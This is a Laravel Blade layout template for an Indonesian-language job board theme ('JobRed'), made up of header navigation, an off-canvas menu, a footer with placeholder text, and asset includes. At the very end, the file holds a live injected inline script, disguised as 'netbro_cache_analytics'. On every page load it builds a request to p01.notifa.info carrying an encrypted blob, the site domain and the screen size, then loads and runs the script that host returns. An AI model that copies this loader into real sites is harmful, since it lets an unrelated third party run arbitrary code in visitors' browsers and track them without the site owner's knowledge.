<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="author" content="Jobboard">
    <title>JobRed</title>
    <link rel="shortcut icon" href="{{ asset('themes/jobboard-demo/assets/img/favicon.png')}}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/css/bootstrap.min.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/css/jasny-bootstrap.min.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/css/bootstrap-select.min.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/css/material-kit.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/fonts/font-awesome.min.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themify-icons/themify-icons.css') }}">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/css/color-switcher.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/extras/animate.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/extras/owl.carousel.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/extras/owl.theme.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/extras/settings.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/css/slicknav.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/css/main.css') }}" type="text/css">
    <link rel="stylesheet" href="{{ asset('themes/jobboard-demo/assets/css/responsive.css') }}" type="text/css">
    <link rel="stylesheet" type="text/css" href="{{ asset('themes/jobboard-demo/assets/css/colors/red.css') }}" media="screen" />
  </head>
  <body>
    <div class="header">
      <section id="intro" class="section-intro">
        <div class="logo-menu">
          <nav class="navbar navbar-default" role="navigation" data-spy="affix" data-offset-top="50">
            <div class="container">
              <div class="navbar-header">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#navbar">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                </button>
                <a class="navbar-brand logo" href="index.html"><img src="{{ asset('themes/jobboard-demo/assets/img/logo.png')}}" alt=""></a>
              </div>
              <div class="collapse navbar-collapse" id="navbar">
                <ul class="nav navbar-nav">
                  <li>
                    <a class="active" href="index.html">
                    Beranda
                    </a>
                    
                  </li>
                  <li>
                    <a class="active" href="index.html">
                    Lowongan Kerja
                    </a>
                    
                  </li>
                  <li>
                    
                    
                  
                  
                </ul>
                <ul class="nav navbar-nav navbar-right float-right">
                  <li class="left"><a href="post-job.html"><i class="ti-pencil-alt"></i> Pasang Lowongan</a></li>
                  <li class="right"><a href="{{ route('login')}}"><i class="ti-lock"></i> Log In</a></li>
                  <li class="right"><a href="{{ route('register')}}"><i class="ti-user"></i> Register</a></li>
                </ul>
              </div>
            </div>
            <ul class="wpb-mobile-menu">
              <li>
                <a class="active" href="index.html">Home</a>
                <ul>
                  <li><a class="active" href="index.html">Home 1</a></li>
                  <li><a href="index-02.html">Home 2</a></li>
                  <li><a href="index-03.html">Home 3</a></li>
                  <li><a href="index-04.html">Home 4</a></li>
                </ul>
              </li>
              <li>
                <a href="about.html">Pages</a>
                <ul>
                  <li><a href="about.html">About</a></li>
                  <li><a href="job-page.html">Job Page</a></li>
                  <li><a href="job-details.html">Job Details</a></li>
                  <li><a href="resume.html">Resume Page</a></li>
                  <li><a href="privacy-policy.html">Privacy Policy</a></li>
                  <li><a href="faq.html">FAQ</a></li>
                  <li><a href="pricing.html">Pricing Tables</a></li>
                  <li><a href="contact.html">Contact</a></li>
                </ul>
              </li>
              <li>
                <a href="#">For Candidates</a>
                <ul>
                  <li><a href="browse-jobs.html">Browse Jobs</a></li>
                  <li><a href="browse-categories.html">Browse Categories</a></li>
                  <li><a href="add-resume.html">Add Resume</a></li>
                  <li><a href="manage-resumes.html">Manage Resumes</a></li>
                  <li><a href="job-alerts.html">Job Alerts</a></li>
                </ul>
              </li>
              <li>
                <a href="#">For Employers</a>
                <ul>
                  <li><a href="post-job.html">Add Job</a></li>
                  <li><a href="manage-jobs.html">Manage Jobs</a></li>
                  <li><a href="manage-applications.html">Manage Applications</a></li>
                  <li><a href="browse-resumes.html">Browse Resumes</a></li>
                </ul>
              </li>
              <li>
                <a href="blog.html">Blog</a>
                <ul class="dropdown">
                  <li><a href="blog.html">Blog - Right Sidebar</a></li>
                  <li><a href="blog-left-sidebar.html">Blog - Left Sidebar</a></li>
                  <li><a href="blog-full-width.html">Blog - Full Width</a></li>
                  <li><a href="single-post.html">Blog Single Post</a></li>
                </ul>
              </li>
              <li class="btn-m"><a href="post-job.html"><i class="ti-pencil-alt"></i> Post A Job</a></li>
              <li class="btn-m"><a href="my-account.html"><i class="ti-lock"></i> Log In</a></li>
            </ul>
          </nav>
          <div class="navmenu navmenu-default navmenu-fixed-left offcanvas">
            <div class="close" data-toggle="offcanvas" data-target=".navmenu">
              <i class="ti-close"></i>
            </div>
            <h3 class="title-menu">All Pages</h3>
            <ul class="nav navmenu-nav">
              <li><a href="index.html">Home</a></li>
              <li><a href="index-02.html">Home Page 2</a></li>
              <li><a href="index-03.html">Home Page 3</a></li>
              <li><a href="index-04.html">Home Page 4</a></li>
              <li><a href="about.html">About us</a></li>
              <li><a href="job-page.html">Job Page</a></li>
              <li><a href="job-details.html">Job Details</a></li>
              <li><a href="resume.html">Resume Page</a></li>
              <li><a href="privacy-policy.html">Privacy Policy</a></li>
              <li><a href="pricing.html">Pricing Tables</a></li>
              <li><a href="browse-jobs.html">Browse Jobs</a></li>
              <li><a href="browse-categories.html">Browse Categories</a></li>
              <li><a href="add-resume.html">Add Resume</a></li>
              <li><a href="manage-resumes.html">Manage Resumes</a></li>
              <li><a href="job-alerts.html">Job Alerts</a></li>
              <li><a href="post-job.html">Add Job</a></li>
              <li><a href="manage-jobs.html">Manage Jobs</a></li>
              <li><a href="manage-applications.html">Manage Applications</a></li>
              <li><a href="browse-resumes.html">Browse Resumes</a></li>
              <li><a href="contact.html">Contact</a></li>
              <li><a href="faq.html">Faq</a></li>
              <li><a href="my-account.html">Login</a></li>
            </ul>
          </div>
          
        </div>
        @yield('search')
      </section>
    </div>
    @yield('content')
    <footer>
      <section class="footer-Content">
        <div class="container">
          <div class="row">
            <div class="col-md-3 col-sm-6 col-xs-12">
              <div class="widget">
                <h3 class="block-title"><img src="{{ asset('themes/jobboard-demo/assets/img/logo.png')}}" class="img-responsive" alt="Footer Logo"></h3>
                <div class="textwidget">
                  <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque lobortis tincidunt est, et euismod purus suscipit quis. Etiam euismod ornare elementum. Sed ex est, consectetur eget facilisis sed.</p>
                </div>
              </div>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-12">
              <div class="widget">
                <h3 class="block-title">Quick Links</h3>
                <ul class="menu">
                  <li><a href="#">About Us</a></li>
                  <li><a href="#">Support</a></li>
                  <li><a href="#">License</a></li>
                  <li><a href="#">Terms & Conditions</a></li>
                  <li><a href="#">Contact</a></li>
                </ul>
              </div>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-12">
              <div class="widget">
                <h3 class="block-title">Trending Jobs</h3>
                <ul class="menu">
                  <li><a href="#">Android Developer</a></li>
                  <li><a href="#">Senior Accountant</a></li>
                  <li><a href="#">Frontend Developer</a></li>
                  <li><a href="#">Junior Tester</a></li>
                  <li><a href="#">Project Manager</a></li>
                </ul>
              </div>
            </div>
            <div class="col-md-3 col-sm-6 col-xs-12">
              <div class="widget">
                <h3 class="block-title">Follow Us</h3>
                <div class="bottom-social-icons social-icon">
                  <a class="twitter" href="https://twitter.com/GrayGrids"><i class="ti-twitter-alt"></i></a>
                  <a class="facebook" href="https://web.facebook.com/GrayGrids"><i class="ti-facebook"></i></a>
                  <a class="youtube" href="https://youtube.com"><i class="ti-youtube"></i></a>
                  <a class="dribble" href="https://dribbble.com/GrayGrids"><i class="ti-dribbble"></i></a>
                  <a class="linkedin" href="https://www.linkedin.com/GrayGrids"><i class="ti-linkedin"></i></a>
                </div>
                <p>Join our mailing list to stay up to date and get notices about our new releases!</p>
                <form class="subscribe-box">
                  <input type="text" placeholder="Your email">
                  <input type="submit" class="btn-system" value="Send">
                </form>
              </div>
            </div>
          </div>
        </div>
      </section>
      <div id="copyright">
        <div class="container">
          <div class="row">
            <div class="col-md-12">
              <div class="site-info text-center">
                <p>All Rights reserved &copy; 2018 - Designed & Developed by <a rel="nofollow" href="http://graygrids.com">Mexu$</a></p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </footer>
    <a href="#" class="back-to-top">
    <i class="ti-arrow-up"></i>
    </a>
    <div id="loading">
      <div id="loading-center">
        <div id="loading-center-absolute">
          <div class="object" id="object_one"></div>
          <div class="object" id="object_two"></div>
          <div class="object" id="object_three"></div>
          <div class="object" id="object_four"></div>
          <div class="object" id="object_five"></div>
          <div class="object" id="object_six"></div>
          <div class="object" id="object_seven"></div>
          <div class="object" id="object_eight"></div>
        </div>
      </div>
    </div>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/jquery-min.js') }}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/bootstrap.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/material.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/material-kit.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/color-switcher.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/jquery.parallax.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/owl.carousel.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/jquery.slicknav.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/main.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/jquery.counterup.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/waypoints.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/jasny-bootstrap.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/bootstrap-select.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/form-validator.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/contact-form-script.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/jquery.themepunch.revolution.min.js')}}"></script>
    <script type="text/javascript" src="{{ asset('themes/jobboard-demo/assets/js/jquery.themepunch.tools.min.js')}}"></script>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mx3azboRc8qrws%2f2eln2j5lYDzGqs1edhomhed8r7D7K9qDHaDkxTjPYTDB7qgtzcUQjLxrXKcbPN8SyPJKH%2f3XFMvW9Z1uePyNVEfm97wUctVZvAe7PZSASgVxzY0xjT%2fyfEdBfiKgcEMXI9F%2fAkrx7N4k2grZl2wcs4HPTnfWCfbom8yApWNGT2g1eu6w5oF7stU0Q3XuBGfkVHnNoV3%2b3CJyGgcBWW%2b0JW3hZ0hkLx%2b241k8thLYJma520wXrM2mztquGPiDAHKcsoOGF%2bduH8SW%2bsTpojdbqly%2fYuZ5FkNgSR%2bflSjNQ8h5Fvb9S41%2bfSvyVmKx0gIVeK2XmACBwc1ocd4he3MqBslAr9IMRuQCAtK5oziuWUmcnyzFzfv174wkFdNgptf37ZqJN%2fLmBLms%2b%2bFsE3vg8Licgb1YlkR%2fJfLRgeJkjQoNbCgLduc4WmEFNgHgAZ6%2fDS74Bcx4vTJFUdg84Evf%2be%2fAKpDKIEZT08ZEmNIvzGliMPJ1WJNFjw9lM%2b47Y%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
  </body>
</html>